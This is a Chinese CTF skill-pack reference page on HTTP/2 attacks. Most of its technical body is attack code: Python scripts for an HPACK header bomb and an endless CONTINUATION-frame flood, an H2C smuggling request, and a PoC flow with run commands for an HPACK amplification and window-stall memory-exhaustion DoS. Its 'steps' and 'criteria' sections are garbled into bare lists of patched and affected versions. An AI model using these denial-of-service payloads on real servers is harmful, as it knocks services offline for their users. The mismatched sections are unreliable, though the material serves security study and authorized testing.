# HTTP/2 攻击

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/08-infra/http2-attacks.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **授权范围**：仅限 CTF 靶场 / AWD 赛场 / 已签署授权的测试环境。任何真实第三方目标、真实凭据、真实支付/生产流量都禁止套用本文流程。
> **什么时候用**：命中「HTTP/2 / h2 / HPACK / stream multiplexing」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- HTTP/2
- h2
- HPACK
- stream multiplexing
- memory exhaustion
- DoS
- CVE-2025-53020
- 协议攻击

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：

| 工具 | 本机状态 | 本机命令 / 替代方案 |
|---|---|---|
| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |

- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。


## 步骤

1. **nginx** — 1.29.8（`max_headers`）
2. **Apache httpd** — mod_http2 v2.0.41
3. **Envoy** — 2026-06-03 补丁
4. **Microsoft IIS** — 公开时未修复
5. **Cloudflare Pingora** — 公开时未修复

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **受影响版本** — 1.29.7 默认配置
- **受影响版本** — 2.4.67
- **受影响版本** — 1.37.2
- **受影响版本** — Windows Server 2025
- **受影响版本** — 0.8.0

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

## HPACK Bomb (CVE-2025-53020)

HTTP/2 HPACK 压缩表可被过量 header 填充 → 内存耗尽。

```python
# HPACK bomb: 大量不同名称的 header → HPACK 表无法复用
# 每个 header name 都不同 → 全部存入 dynamic table → OOM
import socket, ssl

def hpack_bomb(target: str, port: int = 443):
    """HPACK header compression memory exhaustion"""
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(['h2'])
    sock = ctx.wrap_socket(socket.socket(), server_hostname=target)

    # HTTP/2 connection preface
    preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
    # SETTINGS frame
    settings = b'\x00\x00\x00\x04\x00\x00\x00\x00\x00'

    sock.connect((target, port))
    sock.send(preface + settings)

    # 发送大量不同 header name 的 HEADERS frame
    # 每个 header name 不同 → 无法复用 HPACK 引用 → 表膨胀
    for i in range(100000):
        header_name = f"x-bomb-{i:06d}"
        header_block = encode_hpack_literal(header_name, "value")
        frame = build_headers_frame(1, header_block)
        sock.send(frame)

    sock.close()
```

## CONTINUATION Flood (CVE-2024-28182)

```python
# 发送无限 CONTINUATION frames 而不设 END_HEADERS
# → nghttp2/Tomcat/Apache/Node.js 持续缓冲 → CPU + 内存耗尽

def continuation_flood(target: str):
    """CVE-2024-28182: 无限 CONTINUATION frame"""
    sock, _ = connect_h2(target)

    # 初始 HEADERS frame (END_HEADERS=0)
    headers_frame = bytes([
        0x00, 0x00, 0x01,  # length=1
        0x01,              # type=HEADERS
        0x04,              # flags=END_STREAM (no END_HEADERS!)
        0x00, 0x00, 0x00, 0x01,  # stream_id=1
        0x80               # HPACK: empty indexed header
    ])
    sock.send(headers_frame)

    # 无限 CONTINUATION
    while True:
        cont = bytes([
            0x00, 0x00, 0x01,  # length=1
            0x09,              # type=CONTINUATION
            0x00,              # flags=0 (no END_HEADERS!)
            0x00, 0x00, 0x00, 0x01,  # stream_id=1
            0x80               # empty indexed header
        ])
        sock.send(cont)
```

## H2C Upgrade Smuggling

```bash
# H2C (HTTP/2 cleartext) upgrade → 前端 HTTP/1.1 → 后端 HTTP/2
# 攻击者发送 HTTP/1.1 with Upgrade: h2c → 建立到后端的 H2C 连接
# → 绕过前端的 HTTP/1.1 过滤规则

# 探测 H2C
curl -v --http2-prior-knowledge http://target.com/

# 如果后端接受 h2c → 可用 H2C smuggling 注入请求
```

```python
# H2C smuggling: 在 HTTP/1.1 中夹带 HTTP/2 stream
H2C_SMUGGLE = (
    b"GET / HTTP/1.1\r\n"
    b"Host: target.com\r\n"
    b"Upgrade: h2c\r\n"
    b"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n"
    b"Connection: Upgrade\r\n"
    b"\r\n"
    # 后面接 HTTP/2 frames → 前端转发，后端按 H2C 处理
)
```

## Stream Multiplexing Abuse

```python
# HTTP/2 多路复用 → 一个 TCP 连接上多个 stream
# 攻击: 大量 stream 同时发送 → 超过 max_concurrent_streams
# → 服务端 RST_STREAM → 某些 server 实现有 bug → 信息泄露

# 或者: stream ID 重用 → CVE-2024-7246 (gRPC HPACK desync)
# → 泄露其他 stream 的 header key
```

## HTTP/2 Bomb — HPACK 索引引用放大 + 流控窗口停滞（CVE-2026-49975）

低带宽客户端 → 服务器端极高头部内存分配 + WINDOW_UPDATE 阻止释放 → 内存耗尽 DoS。

### 受影响实现

| 实现 | 受影响版本 | 修复版本 |
|------|-----------|---------|
| nginx | 1.29.7 默认配置 | 1.29.8（`max_headers`） |
| Apache httpd | 2.4.67 | mod_http2 v2.0.41 |
| Envoy | 1.37.2 | 2026-06-03 补丁 |
| Microsoft IIS | Windows Server 2025 | 公开时未修复 |
| Cloudflare Pingora | 0.8.0 | 公开时未修复 |

### 根因

**第一层：HPACK 动态表索引用极低成本换取服务器内存分配**

```text
客户端：1 字节索引引用 → 服务器：分配完整头部副本（数百至数千字节）
```

动态表允许一个字节的索引代表一整段头部值。攻击者反复引用同一索引 → 服务器为每次引用分配完整头部副本。

**第二层：WINDOW_UPDATE 停滞阻止内存释放**

```text
客户端间歇性发送极小 WINDOW_UPDATE
→ 既不让连接超时，又持续"钉住"已分配内存
```

**第三层：规范约束与实现缓解之间的缝隙**

RFC 7541 提到 HPACK 内存风险，但很多实现只关注动态表大小上限和帧大小限制，没有同时做好最大头部字段数限制、最大解码头部总大小限制、长期停滞流的生存期限制。

### PoC 核心流程

```python
# 1. 建立 HTTP/2 连接
send_exact(sock, CLIENT_PREFACE)
send_exact(sock, build_settings())

# 2. 启动连接级零窗口信号
send_exact(sock, build_window_update(0, 0))

# 3. 发送带大量索引引用的 HEADERS 帧
headers_frame = build_headers_frame(stream_id, indexed_references=4096)
send_exact(sock, headers_frame)

# 4. 持有连接并维持停滞状态
recv_forever(sock, end_time)
```

### 复现

```bash
cd "CVE-2026-49975 HTTP2 Bomb"
python3 exploit/exploit.py --host 127.0.0.1 --port 443 --hold-seconds 30
python3 exploit/exploit.py --host 127.0.0.1 --port 80 --no-tls \
  --streams 2 --references 4096 --hold-seconds 45
```

### 观察指标

- HTTP/2 服务进程 RSS 快速上升
- 响应延迟或完全不返回
- 单连接内存压力极高（区别于大量连接型 DoS）

## Evidence

记录: HTTP/2 frame 序列 (hex)、服务端响应 SETTINGS/GOAWAY/RST_STREAM、内存/CPU 监控
